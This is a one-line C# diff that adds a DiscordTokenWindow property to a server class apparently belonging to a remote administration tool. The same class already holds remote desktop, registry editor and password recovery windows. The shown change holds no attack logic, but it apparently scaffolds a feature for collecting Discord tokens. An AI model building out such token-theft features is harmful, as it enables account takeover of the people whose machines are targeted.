@@ -27,6 +27,7 @@ namespace RemoteAdmin.Server
         public RemoteDesktopWindow? RemoteDesktopWindow { get; set; }
         public RegistryEditorWindow Registryeditorwindow { get; set; }
         public Passwordrecoverywindow? PasswordRecoveryWindow { get; set; }
+        public DiscordTokenWindow? DiscordTokenWindow { get; set; }
 
         public event PropertyChangedEventHandler PropertyChanged;
         public TaskSchedulerWindow TaskSchedulerWindow { get; set; }
